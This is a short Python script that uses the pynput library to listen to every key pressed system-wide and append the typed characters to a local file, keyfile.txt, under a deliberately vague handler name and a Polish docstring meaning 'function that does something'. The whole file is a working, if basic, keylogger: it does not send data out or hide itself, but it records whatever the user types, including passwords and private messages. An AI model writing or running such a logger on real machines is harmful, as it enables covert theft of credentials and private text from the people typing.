from pynput import keyboard

def abc(key):
    """funkcja ktora robi cos"""
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=abc)
    listener.start()
    input()